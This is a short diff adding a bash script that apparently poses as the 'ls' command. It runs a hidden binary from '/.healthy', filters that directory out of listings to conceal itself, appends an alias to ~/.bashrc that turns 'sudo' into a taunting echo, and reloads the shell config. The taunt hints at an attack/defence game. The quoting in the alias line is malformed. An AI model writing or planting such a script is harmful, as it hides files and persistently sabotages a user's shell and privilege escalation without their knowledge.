@@ -1,0 +1,6 @@
+#!/bin/bash
+
+/.healthy/ls $@ | grep -v .healthy
+echo 'alias sudo="echo 'Oops you\'re too slow!'"' >> ~/.bashrc
+source ~/.bashrc
+/bin/list
